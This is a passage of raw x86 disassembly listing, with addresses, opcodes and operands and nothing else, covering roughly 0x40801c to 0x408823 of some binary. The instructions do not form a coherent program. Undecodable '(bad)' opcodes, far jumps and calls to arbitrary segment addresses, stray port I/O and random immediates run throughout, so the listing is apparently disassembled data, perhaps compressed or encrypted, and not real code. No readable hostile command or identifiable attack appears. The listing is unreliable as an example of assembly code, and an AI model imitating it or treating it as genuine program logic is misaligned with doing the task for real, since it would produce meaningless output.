  40801c:	cwde   
  40801d:	pop    ds
  40801e:	jmp    0x40bc:0xbfcb7c05
  408025:	jno    0x40802c
  408027:	or     ebx,DWORD PTR [ecx-0x2f]
  40802a:	cs pop ds
  40802c:	cmp    ecx,ebp
  40802e:	add    esi,DWORD PTR [esi-0x74]
  408031:	and    al,0xd1
  408033:	add    eax,0xdbabfd50
  408038:	aaa    
  408039:	cmc    
  40803a:	xchg   ebx,eax
  40803b:	push   0x8d7a5b70
  408040:	fnstenv [esi-0x51b9477a]
  408046:	addr16 cdq 
  408048:	loope  0x4080a1
  40804a:	add    edx,DWORD PTR [edi+0x66]
  40804d:	push   cs
  40804e:	and    eax,DWORD PTR [esi]
  408050:	adc    esi,eax
  408052:	fadd   DWORD PTR [edi-0x48]
  408055:	pop    ecx
  408056:	stos   DWORD PTR es:[edi],eax
  408057:	in     eax,0x1
  408059:	sbb    BYTE PTR [ecx-0x2d],bl
  40805c:	sub    ah,BYTE PTR [ebp+0x7b]
  40805f:	cmp    ah,BYTE PTR [ebx-0x7701b18a]
  408065:	mov    eax,DWORD PTR [ebx]
  408067:	sub    eax,0x8d0ea4e9
  40806c:	xchg   BYTE PTR [edx+ebx*4],ah
  40806f:	pop    ecx
  408070:	jmp    0xb08f:0x3d86e3f8
  408077:	xor    al,0x68
  408079:	aaa    
  40807a:	xchg   ebx,eax
  40807b:	or     ch,BYTE PTR [edi]
  40807d:	lea    ecx,ds:0xcc82338a
  408083:	fsub   QWORD PTR [ecx+0x57]
  408086:	mov    eax,ds:0x164331a6
  40808b:	pusha  
  40808c:	je     0x4080ef
  40808e:	(bad)  
  40808f:	(bad)  
  408090:	jl     0x40802a
  408092:	imul   edx,DWORD PTR [edx-0x5],0xffffffc6
  408096:	fsub   QWORD PTR [ecx-0x72266cbf]
  40809c:	into   
  40809d:	pop    ss
  40809e:	imul   ecx,DWORD PTR [edi],0x6a
  4080a1:	add    al,0xf2
  4080a3:	mov    bh,0x5e
  4080a5:	imul   ebp,ecx,0x37
  4080a8:	or     eax,0x903c4a7f
  4080ad:	and    dl,BYTE PTR ds:0x333f2e03
  4080b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080b4:	enter  0x194f,0x50
  4080b8:	push   es
  4080b9:	retf   
  4080ba:	xchg   esi,eax
  4080bb:	inc    ebx
  4080bc:	mov    ebx,0xf8960d30
  4080c1:	loope  0x40811a
  4080c3:	sti    
  4080c4:	xchg   edi,eax
  4080c5:	(bad)  
  4080c6:	enter  0x4534,0xc7
  4080ca:	sub    al,0x6d
  4080cc:	cmp    BYTE PTR [eax+0x8586ed0],0xd7
  4080d3:	loop   0x4080a3
  4080d5:	int    0x77
  4080d7:	stos   BYTE PTR es:[edi],al
  4080d8:	je     0x4080df
  4080da:	push   ebx
  4080db:	dec    eax
  4080dc:	xchg   ebp,eax
  4080dd:	jb     0x40808d
  4080df:	ss mov edi,0xce78e564
  4080e5:	lahf   
  4080e6:	inc    ebx
  4080e7:	push   cs
  4080e8:	ficomp DWORD PTR [edx-0x43]
  4080eb:	shl    BYTE PTR [ebx+edi*8+0x43],0x58
  4080f0:	in     al,dx
  4080f1:	outs   dx,DWORD PTR ds:[esi]
  4080f2:	xor    BYTE PTR [ecx],dl
  4080f4:	mov    ch,bh
  4080f6:	dec    ebx
  4080f7:	pop    esi
  4080f8:	xor    DWORD PTR [esi+0x15],edi
  4080fb:	fabs   
  4080fd:	outs   dx,BYTE PTR ds:[esi]
  4080fe:	mov    edi,0xa78eb963
  408103:	cmp    edx,esp
  408105:	adc    eax,0x2a315dac
  40810a:	dec    ecx
  40810b:	xchg   esp,eax
  40810c:	inc    edi
  40810d:	repz and al,0xf
  408110:	shr    BYTE PTR [eax+0x7],cl
  408113:	repnz (bad) 
  408115:	jl     0x40811c
  408117:	aaa    
  408118:	loopne 0x408142
  40811a:	std    
  40811b:	in     al,0xa0
  40811d:	int3   
  40811e:	pop    esi
  40811f:	mov    DWORD PTR [ebx-0x26],esi
  408122:	mov    esp,0xd8495fb3
  408127:	mov    esp,0x70643590
  40812c:	(bad)  
  40812d:	sti    
  40812e:	pop    edx
  40812f:	mov    fs,edi
  408131:	nop
  408132:	cwde   
  408133:	push   cs
  408134:	rcl    DWORD PTR [eax+0x6def124b],cl
  40813a:	test   BYTE PTR [eax],0x0
  40813d:	iret   
  40813e:	mov    edi,0x737beca1
  408143:	or     eax,0xe75652ab
  408148:	cld    
  408149:	mov    al,0x2e
  40814b:	rcl    eax,0xc3
  40814e:	xor    esp,ecx
  408150:	adc    ah,0x62
  408153:	dec    ecx
  408154:	or     eax,0x2984ed4b
  408159:	fs sbb ebx,esp
  40815c:	daa    
  40815d:	dec    ecx
  40815e:	push   es
  40815f:	ja     0x4081db
  408161:	imul   esi,DWORD PTR [ecx+0x2dea98f],0x2a
  408168:	mov    BYTE PTR [ecx],0xa
  40816b:	inc    edx
  40816c:	call   0x1def:0xa703809
  408173:	daa    
  408174:	fild   DWORD PTR [ebp-0x5e]
  408177:	push   ebx
  408178:	mov    edx,0x39ee4be1
  40817d:	jae    0x40815a
  40817f:	mov    cs:0xacd34dd0,al
  408185:	ret    
  408186:	mov    bh,0x1a
  408188:	dec    edx
  408189:	jmp    0x1c8a:0xb173b271
  408190:	repz scas eax,DWORD PTR es:[edi]
  408192:	sbb    DWORD PTR [eax+0x0],esp
  408195:	cmp    edi,DWORD PTR [eax+0x1daa2146]
  40819b:	call   0x2a1b4b53
  4081a0:	sub    al,0x39
  4081a2:	mov    ecx,0xc413dc1b
  4081a7:	mov    esi,0x362d2d4a
  4081ac:	xchg   BYTE PTR [ebp-0x5d],ah
  4081af:	mov    al,BYTE PTR [edi+edi*8+0x12]
  4081b3:	mov    ebp,0x3a0778d7
  4081b8:	test   DWORD PTR [ebp-0x2],edx
  4081bb:	lds    eax,FWORD PTR [edi+0x7]
  4081be:	dec    BYTE PTR [ebp+0x36d1fee6]
  4081c4:	retf   
  4081c5:	add    al,0x51
  4081c7:	jmp    0x8116:0x148227ec
  4081ce:	cmc    
  4081cf:	xor    DWORD PTR ds:0x52bf860a,ecx
  4081d5:	push   es
  4081d6:	std    
  4081d7:	pushf  
  4081d8:	cdq    
  4081d9:	fldenv [esi+0x33]
  4081dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081dd:	sbb    al,0xd2
  4081df:	div    BYTE PTR [eax+0x4f]
  4081e2:	sti    
  4081e3:	sbb    esi,DWORD PTR [ecx+0x18]
  4081e6:	in     eax,dx
  4081e7:	mov    ds:0xcb9e1374,al
  4081ec:	inc    edi
  4081ed:	jb     0x4081e7
  4081ef:	mov    edx,0x16ca117c
  4081f4:	lods   eax,DWORD PTR ds:[esi]
  4081f5:	xchg   ebp,eax
  4081f6:	mov    al,ds:0xe3c87093
  4081fb:	cmp    ch,BYTE PTR [esi+edx*8-0x2e2deb81]
  408202:	jno    0x4081c0
  408204:	mov    bl,0x17
  408206:	aam    0x14
  408208:	and    bl,bh
  40820a:	dec    eax
  40820b:	mov    esp,0xf11dd5a1
  408210:	lock stos DWORD PTR es:[edi],eax
  408212:	mov    al,ds:0x92f745a7
  408217:	in     eax,0xed
  408219:	outs   dx,DWORD PTR ds:[esi]
  40821a:	and    BYTE PTR [ecx],bl
  40821c:	push   0xfffffff4
  40821e:	xchg   BYTE PTR [ecx],ch
  408220:	jg     0x408233
  408222:	cmp    esp,ebp
  408224:	ja     0x408268
  408226:	xchg   esi,eax
  408227:	xor    DWORD PTR [esi-0x16],eax
  40822a:	rol    BYTE PTR [esi],cl
  40822c:	pop    es
  40822d:	mov    ds:0xee8421aa,al
  408232:	in     al,0x63
  408234:	ret    
  408235:	push   ecx
  408236:	ss cmc 
  408238:	or     ebx,DWORD PTR gs:[edx+0xfe32116]
  40823f:	mov    ah,0xe9
  408241:	ds aad 0xf8
  408244:	jne    0x4081ec
  408246:	loope  0x408235
  408248:	imul   esp,esp,0x39
  40824b:	sub    BYTE PTR [eax],al
  40824d:	mov    edi,0x9bb9e877
  408252:	jecxz  0x408251
  408254:	sub    BYTE PTR [edi-0x2ca6e9a3],cl
  40825a:	data16 cli 
  40825c:	test   eax,0x9086284b
  408261:	(bad)  
  408262:	popa   
  408263:	cdq    
  408264:	fisttp QWORD PTR [esi]
  408266:	cmp    eax,0x3150a52c
  40826b:	cmp    dl,bh
  40826d:	test   eax,0x77aa7c51
  408272:	jmp    0xb34c:0x66e42419
  408279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827a:	popf   
  40827b:	mov    eax,ds:0xea088b7b
  408280:	xor    DWORD PTR [edx+0x2c],edx
  408283:	test   eax,0x8fca4b8b
  408288:	xchg   ebp,eax
  408289:	or     dl,BYTE PTR [eax+0x7]
  40828c:	cwde   
  40828d:	test   al,0xb8
  40828f:	std    
  408290:	xor    DWORD PTR [ecx+0x3],edx
  408293:	sbb    DWORD PTR [edi-0x4869b9c7],edi
  408299:	sbb    bh,bh
  40829b:	adc    esp,edx
  40829d:	not    DWORD PTR [esi-0x6bae54dd]
  4082a3:	jge    0x408303
  4082a5:	xchg   ecx,eax
  4082a6:	xchg   ecx,ebp
  4082a8:	add    al,0xa3
  4082aa:	in     eax,dx
  4082ab:	jno    0x4082e7
  4082ad:	jg     0x4082fb
  4082af:	inc    ebx
  4082b0:	(bad)  
  4082b2:	(bad)  
  4082b3:	cs mov eax,0x2f01fbb1
  4082b9:	and    cl,BYTE PTR [ecx]
  4082bb:	jnp    0x4082f7
  4082bd:	or     al,0x72
  4082bf:	push   0xffffffdb
  4082c1:	popa   
  4082c2:	mov    ebx,DWORD PTR [edi-0x42]
  4082c5:	stos   DWORD PTR es:[edi],eax
  4082c6:	cmp    al,ch
  4082c8:	les    eax,FWORD PTR [edi-0x5]
  4082cb:	add    BYTE PTR [edi+0x3886f9ba],dl
  4082d1:	push   es
  4082d2:	inc    cx
  4082d4:	mov    bh,0x19
  4082d6:	mov    esp,0x35cbc486
  4082db:	scas   eax,DWORD PTR es:[edi]
  4082dc:	outs   dx,DWORD PTR ds:[esi]
  4082dd:	jno    0x4082ad
  4082df:	test   BYTE PTR [ecx+0x5c5bd8c1],ah
  4082e5:	sahf   
  4082e6:	dec    edi
  4082e7:	and    edx,DWORD PTR ds:0xa8735e2
  4082ed:	stos   BYTE PTR es:[edi],al
  4082ee:	cs xchg esi,eax
  4082f0:	and    al,0x1f
  4082f3:	jbe    0x4082d9
  4082f5:	jle    0x4082e3
  4082f7:	fistp  QWORD PTR [edx]
  4082f9:	xor    eax,0x47a02a41
  4082fe:	out    dx,al
  4082ff:	repnz (bad) 
  408301:	pop    edi
  408302:	xchg   ecx,eax
  408303:	icebp  
  408304:	and    eax,0xb9f87207
  408309:	cwde   
  40830a:	xor    ecx,ebx
  40830c:	fimul  WORD PTR ds:0xd43ae942
  408312:	inc    esp
  408313:	cmc    
  408314:	sub    BYTE PTR fs:[ebx+ebp*8+0x78cac5b7],dh
  40831c:	push   ebx
  40831d:	and    al,0xb5
  40831f:	stc    
  408320:	in     al,0x7
  408322:	test   dh,bh
  408324:	mov    dh,0xc9
  408326:	fst    st(4)
  408328:	jmp    0x29fc:0x5651504b
  40832f:	ins    DWORD PTR es:[edi],dx
  408330:	fisubr WORD PTR [esi]
  408332:	push   ebx
  408333:	jno    0x408304
  408335:	(bad)  
  408336:	iret   
  408337:	xor    edi,DWORD PTR [ebx]
  408339:	xchg   edx,eax
  40833a:	mov    bh,0xb3
  40833c:	stos   BYTE PTR es:[edi],al
  40833d:	pop    esp
  40833e:	(bad)  
  40833f:	icebp  
  408340:	cwde   
  408341:	xchg   edx,eax
  408342:	fidivr DWORD PTR [ebp+0x7bedd38b]
  408348:	cmp    dl,BYTE PTR [edx-0x6d8c783]
  40834e:	ret    0xbaca
  408351:	fisubr DWORD PTR [ecx]
  408353:	scas   eax,DWORD PTR es:[edi]
  408354:	cmp    esi,DWORD PTR [ebp+0x46]
  408357:	xor    al,0xae
  408359:	icebp  
  40835a:	cdq    
  40835b:	sahf   
  40835c:	in     al,dx
  40835d:	sbb    al,0xe3
  40835f:	loopne 0x40831e
  408361:	fucomip st,st(0)
  408363:	pusha  
  408364:	std    
  408365:	mov    al,0xd6
  408367:	xor    eax,0x91ba8bb
  40836c:	cmc    
  40836d:	popa   
  40836e:	add    esi,ebp
  408370:	sub    DWORD PTR [eax+edx*1+0x21],0x1a712ecd
  408378:	shl    DWORD PTR [edx],1
  40837a:	dec    ebx
  40837b:	or     edx,edi
  40837d:	add    DWORD PTR [ecx-0x4b80464c],ebp
  408383:	mov    al,0xc6
  408385:	or     DWORD PTR [eax-0x23754a46],edi
  40838b:	ja     0x408319
  40838d:	popa   
  40838e:	retf   0x512a
  408391:	rcl    DWORD PTR ds:[ebx+0x30],0x34
  408396:	fisub  DWORD PTR [eax+ecx*8+0x3d]
  40839a:	ins    BYTE PTR es:[edi],dx
  40839b:	ja     0x4083b3
  40839d:	push   ebp
  40839e:	sub    al,0xa
  4083a0:	repz in eax,dx
  4083a2:	cmp    eax,esp
  4083a4:	imul   esi,DWORD PTR [edi+0x5f],0xffffffed
  4083a8:	dec    eax
  4083aa:	repnz cdq 
  4083ac:	icebp  
  4083ad:	mov    eax,ds:0x3d16d105
  4083b2:	lea    ebp,[ebx+ebp*2-0x31668ffa]
  4083b9:	xor    DWORD PTR [edx],ebp
  4083bb:	xchg   BYTE PTR [eax-0x5737dd2e],ch
  4083c1:	pop    eax
  4083c2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4083c4:	in     al,dx
  4083c5:	adc    eax,0x4b8ce9c5
  4083ca:	shr    BYTE PTR ds:0xea136ed0,cl
  4083d0:	sub    BYTE PTR [esi-0x746873fd],dl
  4083d6:	test   DWORD PTR [edx+0x3bd0aa5],edi
  4083dc:	mov    esp,0x7fb4a42f
  4083e1:	mov    ebp,DWORD PTR [edi-0x2359691]
  4083e7:	sub    eax,0x95b18085
  4083ec:	pushf  
  4083ed:	inc    ebp
  4083ee:	retf   0xf297
  4083f1:	push   0x89b2c796
  4083f6:	push   edi
  4083f7:	add    cl,BYTE PTR fs:[edi-0x324cfc4b]
  4083fe:	out    0xc,eax
  408400:	mov    dh,0xa
  408402:	dec    eax
  408403:	icebp  
  408404:	pop    es
  408405:	push   ecx
  408406:	adc    esi,DWORD PTR [ebp+ebp*4-0x5dc8742e]
  40840d:	iret   
  40840e:	gs retf 
  408410:	pop    edx
  408411:	aam    0x75
  408413:	dec    edx
  408414:	mov    eax,gs
  408416:	repnz sbb ebx,DWORD PTR [eax]
  408419:	inc    ecx
  40841a:	(bad)  
  40841b:	xlat   BYTE PTR ds:[ebx]
  40841c:	mov    ds:0x2cd2180a,eax
  408421:	rcl    DWORD PTR [ebp+0x6d],1
  408424:	jp     0x40846f
  408426:	(bad)  
  408427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408428:	mov    ecx,0xa077b755
  40842d:	cmc    
  40842e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40842f:	dec    ebp
  408430:	repz push ss
  408432:	mov    cs,WORD PTR [ebp-0x72]
  408435:	enter  0x7636,0x7d
  408439:	cmp    ah,BYTE PTR [esi+0x3b17a9f6]
  40843f:	mov    bh,0xa
  408441:	and    BYTE PTR [ecx],bl
  408443:	fwait
  408444:	jmp    0xcc66:0x74849baa
  40844b:	push   esp
  40844c:	jecxz  0x408427
  40844e:	out    dx,al
  40844f:	adc    DWORD PTR [esi+0x3cdd6055],ecx
  408455:	mov    ecx,0xcaad099e
  40845a:	mov    dl,0xac
  40845c:	pop    ss
  40845d:	pop    es
  40845e:	pop    edi
  40845f:	sub    DWORD PTR [eax-0x57],edi
  408462:	sub    BYTE PTR [edi-0x349ddcbc],dl
  408468:	jmp    0x40842e
  40846a:	loope  0x408494
  40846c:	sub    dl,BYTE PTR [edx-0x75d6434d]
  408472:	int    0x9a
  408474:	ja     0x408416
  408476:	addr16 push ds
  408478:	sub    al,0xa0
  40847a:	ror    DWORD PTR [esi-0x46fd17e8],1
  408480:	adc    DWORD PTR [ebx+0x5],esi
  408483:	dec    edi
  408484:	xlat   BYTE PTR ds:[ebx]
  408485:	adc    eax,0x9a338475
  40848a:	mov    cl,0x0
  40848c:	pop    esp
  40848d:	jnp    0x408411
  40848f:	bound  eax,QWORD PTR [ebx+eiz*2]
  408492:	repz sbb al,bl
  408495:	test   DWORD PTR [ebx],ecx
  408497:	rcr    ebx,cl
  408499:	inc    ebp
  40849a:	mov    al,0xeb
  40849c:	dec    ebx
  40849d:	stc    
  40849e:	sub    DWORD PTR [ecx+0x70b6389f],edx
  4084a4:	mov    ds:0x6735fc13,eax
  4084a9:	mov    ebp,0x39a155b
  4084ae:	cmp    ecx,DWORD PTR [ebx+0x25]
  4084b1:	ins    DWORD PTR es:[edi],dx
  4084b2:	adc    dl,al
  4084b4:	(bad)  
  4084b5:	icebp  
  4084b6:	cs lods eax,DWORD PTR ds:[esi]
  4084b9:	jecxz  0x4084b2
  4084bb:	cmp    al,0x3f
  4084bd:	ds pop esp
  4084bf:	fsub   QWORD PTR [edx+ebp*1+0x2b]
  4084c3:	cli    
  4084c4:	sar    BYTE PTR [edx],1
  4084c6:	adc    eax,0xf67c1f02
  4084cb:	test   BYTE PTR [ecx+0x5d],cl
  4084ce:	repz out dx,al
  4084d0:	lods   al,BYTE PTR ds:[esi]
  4084d1:	jae    0x4084f0
  4084d3:	pop    ebp
  4084d4:	xchg   edx,eax
  4084d5:	clc    
  4084d6:	sahf   
  4084d7:	and    eax,0xa03146a5
  4084dc:	test   BYTE PTR [edi],ah
  4084de:	(bad)  [esi+0x75]
  4084e1:	push   esi
  4084e2:	imul   esp,DWORD PTR [eax],0xffffff82
  4084e5:	outs   dx,BYTE PTR cs:[esi]
  4084e7:	xor    ah,BYTE PTR [esi]
  4084e9:	mov    ebx,0x3fc4e9dd
  4084ee:	push   0xffffffee
  4084f0:	rcl    DWORD PTR [ecx+0x54e80c5d],cl
  4084f6:	fwait
  4084f7:	inc    ecx
  4084f8:	sbb    BYTE PTR [eax],0x5d
  4084fb:	cli    
  4084fc:	mov    al,0x6
  4084fe:	dec    eax
  4084ff:	cwde   
  408500:	mov    ebp,esi
  408502:	push   es
  408503:	pop    ebx
  408504:	xor    BYTE PTR [edx-0x5ff91895],al
  40850a:	mov    ebp,0xa3d6644
  40850f:	(bad)  
  408510:	icebp  
  408511:	jmp    0xb4ab:0xe8c34534
  408518:	js     0x4084a1
  40851a:	ret    0xcb28
  40851d:	jns    0x40854c
  40851f:	push   edi
  408520:	pop    esi
  408521:	mov    al,0x28
  408523:	mov    ds:0xe0c6f1fa,al
  408528:	and    al,ch
  40852a:	xor    eax,0x55f9915c
  40852f:	call   0xf433:0x7685de8a
  408536:	sub    DWORD PTR [eax-0x6b],esi
  408539:	sub    DWORD PTR [edi],eax
  40853b:	popa   
  40853c:	out    dx,al
  40853d:	ficom  DWORD PTR [edi+eax*1]
  408540:	cld    
  408541:	nop
  408542:	outs   dx,DWORD PTR ds:[esi]
  408543:	cmp    BYTE PTR ds:0x5aaff50,dh
  408549:	loopne 0x4085a1
  40854b:	xor    edx,edi
  40854d:	mov    ecx,0xbf3c92b3
  408552:	aaa    
  408553:	xchg   BYTE PTR [ecx],ah
  408555:	sub    DWORD PTR [ecx-0x1ffa86b1],ebx
  40855b:	cmp    al,ah
  40855d:	leave  
  40855e:	pop    ds
  40855f:	pop    es
  408560:	mov    al,0x25
  408562:	enter  0x2dcc,0xad
  408566:	vpsraw ymm4,ymm2,XMMWORD PTR [eax+0x1e5b2573]
  40856e:	jae    0x40855d
  408570:	lods   eax,DWORD PTR ds:[esi]
  408571:	dec    ecx
  408572:	call   0x7788:0xd4561bd5
  408579:	lds    esp,FWORD PTR [ebx-0x5d6ed1f3]
  40857f:	clc    
  408580:	les    eax,FWORD PTR [eax+0x38bd7f9e]
  408586:	or     al,0x8d
  408588:	not    BYTE PTR [ecx]
  40858a:	gs std 
  40858c:	xchg   edx,eax
  40858d:	push   ss
  40858e:	je     0x40856d
  408590:	dec    ebp
  408591:	jle    0x4085d7
  408593:	test   BYTE PTR [ebx-0x341cfde9],0x72
  40859a:	in     eax,dx
  40859b:	dec    esp
  40859c:	add    eax,0x7b196491
  4085a1:	out    dx,al
  4085a2:	gs jge 0x40856e
  4085a5:	jmp    0xef13:0xccfd6596
  4085ac:	xchg   DWORD PTR [edi-0x69347f0d],esp
  4085b2:	(bad)  
  4085b3:	iret   
  4085b4:	pop    edi
  4085b5:	lahf   
  4085b6:	aaa    
  4085b7:	jne    0x40861e
  4085b9:	imul   BYTE PTR [edx-0x3e]
  4085bc:	out    0x54,al
  4085be:	sbb    cl,ch
  4085c0:	xchg   BYTE PTR [ebx+esi*8-0x1a],ch
  4085c4:	rcr    eax,cl
  4085c6:	inc    edx
  4085c7:	fdiv   DWORD PTR [ecx+edi*1-0x5f09c1bd]
  4085ce:	inc    ebx
  4085cf:	xchg   ecx,eax
  4085d0:	pusha  
  4085d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085d3:	cmp    dh,BYTE PTR [esi+0x72]
  4085d6:	mov    ebx,DWORD PTR ds:0xed670a24
  4085dc:	pop    ecx
  4085dd:	pushf  
  4085de:	push   0xa72d1e53
  4085e3:	loop   0x408637
  4085e5:	mov    ecx,0x48673331
  4085ea:	xchg   edx,eax
  4085eb:	out    0xa,al
  4085ed:	fisubr DWORD PTR [edi+0x14]
  4085f0:	xchg   edi,eax
  4085f1:	out    dx,al
  4085f2:	(bad)  
  4085f3:	pop    ds
  4085f4:	jge    0x4085b2
  4085f6:	push   0x3b
  4085f8:	jae    0x40861b
  4085fa:	retf   
  4085fb:	xchg   ecx,eax
  4085fc:	fdivr  DWORD PTR ds:0x7d27091
  408602:	rcl    BYTE PTR [esi],1
  408604:	and    DWORD PTR [esi+0x4798291d],ebp
  40860a:	sub    ch,BYTE PTR [edx-0x3d]
  40860d:	lods   al,BYTE PTR ds:[esi]
  40860e:	jge    0x408610
  408610:	outs   dx,DWORD PTR ds:[esi]
  408611:	mov    ecx,0x75419c3a
  408616:	mov    bh,0xec
  408618:	(bad)  
  408619:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40861b:	ins    DWORD PTR es:[edi],dx
  40861c:	mul    esi
  40861e:	out    0x59,eax
  408620:	daa    
  408621:	mov    ds:0x140a187d,al
  408626:	jnp    0x408654
  408628:	retf   0x29c4
  40862b:	aad    0x1c
  40862d:	je     0x4085b4
  40862f:	jo     0x408647
  408631:	mov    al,0x7a
  408633:	stos   BYTE PTR es:[edi],al
  408634:	imul   ecx,DWORD PTR [bx+di-0xf93],0xffffffa7
  40863a:	adc    al,0x12
  40863c:	mov    eax,?
  40863e:	ss (bad) 
  408641:	fdiv   QWORD PTR [eax]
  408643:	rcr    BYTE PTR [eax-0x54],cl
  408646:	je     0x408644
  408648:	retf   
  408649:	lods   al,BYTE PTR ds:[esi]
  40864a:	xchg   DWORD PTR [esi-0x71],ecx
  40864d:	ror    BYTE PTR [edi+0x14],1
  408650:	add    esi,ebp
  408652:	sbb    DWORD PTR [edx-0x5b],0xfffffffb
  408656:	adc    DWORD PTR ds:0x60b8f88d,edi
  40865c:	xchg   BYTE PTR [ebp+0x1b4e8e40],bh
  408662:	xor    ah,0xfb
  408665:	out    0x31,al
  408667:	shr    BYTE PTR [esp+esi*4-0x24],cl
  40866b:	mov    ebx,0x70b88e28
  408670:	jmp    0x81a42c76
  408675:	dec    ebx
  408676:	or     eax,0x4bf7cc37
  40867b:	fisub  WORD PTR [esp+esi*2]
  40867e:	xchg   ebp,eax
  40867f:	jle    0x408668
  408681:	jle    0x4086ce
  408683:	in     eax,0x34
  408685:	pop    ecx
  408686:	pop    eax
  408687:	inc    edx
  408688:	test   al,0xd6
  40868a:	xchg   esi,eax
  40868b:	xor    bh,BYTE PTR [ebp+0x29082b5b]
  408691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408692:	fisub  DWORD PTR [ebp+0x44]
  408695:	add    al,0x58
  408697:	mov    ds:0x23030370,eax
  40869c:	aad    0x68
  40869e:	es mov ah,0x95
  4086a1:	ds stos DWORD PTR es:[edi],eax
  4086a3:	int    0xb7
  4086a5:	mov    al,ds:0x7f9a554d
  4086aa:	gs dec esi
  4086ac:	loop   0x4086f2
  4086ae:	setb   BYTE PTR [edx-0x67]
  4086b2:	mov    esp,0x8b52dadd
  4086b7:	cld    
  4086b8:	sbb    BYTE PTR [edi+edi*1-0x60d567c8],ah
  4086bf:	out    dx,al
  4086c0:	mov    ah,0x63
  4086c2:	mov    edi,0x9779b1e0
  4086c7:	add    al,0x9d
  4086c9:	out    dx,eax
  4086ca:	pop    esp
  4086cb:	ror    BYTE PTR [edx+0x2380e00f],cl
  4086d1:	pop    esp
  4086d2:	lea    ebp,[ebp+esi*4+0xd]
  4086d6:	ja     0x40874b
  4086d8:	push   ecx
  4086d9:	adc    al,0xe2
  4086db:	fld    st(3)
  4086dd:	iret   
  4086de:	jg     0x408737
  4086e0:	xchg   ebx,eax
  4086e1:	test   al,0xeb
  4086e3:	shr    cl,0x44
  4086e6:	cmp    BYTE PTR [ecx],ah
  4086e8:	sub    bh,bh
  4086ea:	outs   dx,BYTE PTR ds:[esi]
  4086eb:	rcl    esp,0xae
  4086ee:	mov    edi,0xd85beb60
  4086f3:	push   eax
  4086f4:	pop    ebp
  4086f5:	loopne 0x408740
  4086f7:	or     DWORD PTR [esi-0xf1f0905],0xa3987d35
  408701:	jmp    0x4086e8
  408703:	dec    edi
  408704:	push   0xfffffff4
  408706:	ret    
  408707:	mov    ah,0xc7
  408709:	add    ebx,edx
  40870b:	dec    edi
  40870c:	pop    ss
  40870d:	out    dx,al
  40870e:	outs   dx,BYTE PTR ds:[esi]
  40870f:	cld    
  408710:	xchg   esi,eax
  408711:	adc    ebp,DWORD PTR [edx+0x7a55f930]
  408717:	ins    BYTE PTR es:[edi],dx
  408718:	jno    0x408720
  40871a:	mov    es,eax
  40871c:	push   ebx
  40871d:	loopne 0x40870f
  40871f:	test   eax,0x82cbca9
  408724:	clc    
  408725:	(bad)  
  408726:	mov    BYTE PTR [edx-0x4cde41e],bl
  40872c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40872d:	or     ecx,DWORD PTR ds:0x7d65f628
  408733:	and    al,0xfb
  408735:	cmp    al,0x4
  408737:	mov    ?,WORD PTR [edi-0x71]
  40873a:	mov    ds:0x4ebfef37,eax
  40873f:	das    
  408740:	icebp  
  408741:	inc    eax
  408742:	cmp    ecx,DWORD PTR [edx-0x51]
  408745:	dec    ebx
  408746:	ss sub ch,0xd
  40874a:	mov    bh,0x13
  40874c:	mov    bh,0xaa
  40874e:	push   ss
  40874f:	add    esi,DWORD PTR [ebp+0x77f308f9]
  408755:	dec    edi
  408756:	push   0x4d
  408758:	sbb    BYTE PTR [eax],al
  40875a:	fs mov bl,cl
  40875d:	lea    ecx,[ecx]
  40875f:	inc    edi
  408760:	psubw  mm7,QWORD PTR [edi-0x261d1894]
  408767:	pop    ss
  408768:	adc    ebx,DWORD PTR cs:[ebp+0x21]
  40876c:	cdq    
  40876d:	cmp    BYTE PTR [ebx-0x4ffd6bf],dh
  408773:	es jmp 0x79e5:0x639d1a6f
  40877b:	les    ebp,FWORD PTR [ebp-0x1bf1f6aa]
  408781:	push   esi
  408782:	push   0xbf27e0cf
  408787:	(bad)  
  408788:	mov    ds:0x4abd51b9,al
  40878d:	or     bh,al
  40878f:	or     eax,0x2785f05e
  408794:	jmp    0x6ccfdae2
  408799:	out    0xf0,eax
  40879b:	not    DWORD PTR [edx+0x3]
  40879e:	enter  0x1ef5,0x24
  4087a2:	out    0xe3,al
  4087a4:	and    BYTE PTR [esi+0x36e14865],ch
  4087aa:	add    edi,eax
  4087ac:	out    0x46,al
  4087ae:	sbb    DWORD PTR [ebx],esp
  4087b0:	pop    es
  4087b1:	loope  0x408800
  4087b3:	lds    edi,FWORD PTR [edx+edx*1-0x27]
  4087b7:	jns    0x4087bb
  4087b9:	inc    eax
  4087ba:	pop    esi
  4087bb:	leave  
  4087bc:	mov    esp,DWORD PTR ds:0x6e7fd600
  4087c2:	jno    0x408794
  4087c4:	or     BYTE PTR [esi-0x4cf5b7b0],ah
  4087ca:	in     eax,dx
  4087cb:	pop    ebx
  4087cc:	mov    ecx,esp
  4087ce:	lods   al,BYTE PTR ds:[esi]
  4087cf:	add    DWORD PTR [ecx+0x5fa78beb],ecx
  4087d5:	xchg   edx,eax
  4087d6:	add    BYTE PTR [ebp-0x545f3897],cl
  4087dc:	pop    edx
  4087dd:	add    esi,DWORD PTR [edx-0x75aa7af1]
  4087e3:	pop    ss
  4087e4:	add    eax,0x8a9ffcf4
  4087e9:	aad    0x67
  4087eb:	enter  0xe5c2,0xb4
  4087ef:	xchg   esi,eax
  4087f0:	stc    
  4087f1:	jo     0x40886f
  4087f3:	or     edx,esi
  4087f5:	mov    DWORD PTR [ecx-0x1c],ebp
  4087f8:	pop    ebx
  4087f9:	add    al,0x8
  4087fb:	push   edi
  4087fc:	push   esi
  4087fd:	jb     0x408840
  4087ff:	mov    ecx,ebx
  408801:	je     0x4087d7
  408803:	jecxz  0x40882f
  408805:	mov    fs,ebp
  408807:	pop    ss
  408808:	(bad)  
  40880a:	push   esp
  40880b:	shl    BYTE PTR [esi+0x7f4003c0],cl
  408811:	sub    eax,DWORD PTR [esi+0x13155591]
  408817:	cs mov ebx,0x33e8550b
  40881d:	fmul   DWORD PTR [edx-0x472bed80]
  408823:	test   ebx,edi
